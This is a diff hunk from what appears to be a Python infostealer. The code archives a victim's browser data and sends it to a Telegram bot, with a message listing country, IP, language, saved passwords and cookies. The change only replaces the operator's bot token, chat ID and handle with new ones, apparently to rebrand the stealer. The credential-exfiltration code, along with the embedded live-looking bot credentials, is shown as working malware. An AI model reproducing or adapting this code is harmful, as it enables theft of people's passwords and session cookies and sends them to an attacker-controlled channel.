@@ -682,9 +682,9 @@ async def main():
     name_f = f"{country}_{ip}_{current_time}"
     z_ph = os.path.join(os.environ["TEMP"], name_f + ".zip")
     shutil.make_archive(z_ph[:-4], "zip", path_data)
-    TOKEN = "6942196864:AAHWtmrtk-o0spSYNv2uSKNEPrY0Nn2X6Dc"
-    ID = "6188551502"
-    body = f"==== @CyberCrlm3 ====\n⏰ Date => {datetime.now().strftime('%m/%d/%Y %H:%M')}\n🏴 Country => [{country}]\n🔍 IP => {ip}\n📝 Language => {language}\n====[ Browsers Data ]====\n🗝 Passwords => {passwd}\n🍪 Cookies => {cookies}"
+    TOKEN = "6462195738:AAHuj034oSgaV07Rg3oKiYTPZ2krFw10Suo"
+    ID = "5522135236"
+    body = f"==== @ThanhPC ====\n⏰ Date => {datetime.now().strftime('%m/%d/%Y %H:%M')}\n💻 Country => [{country}]\n🔍 IP => {ip}\n📝 Language => {language}\n====[ Browsers Data ]====\n🔑 Passwords => {passwd}\n🍪 Cookies => {cookies}"
     await sendfile(TOKEN, ID, z_ph, body)
     shutil.rmtree(os.environ["TEMP"], name_f + ".zip")
     shutil.rmtree(os.environ["TEMP"], name_f)
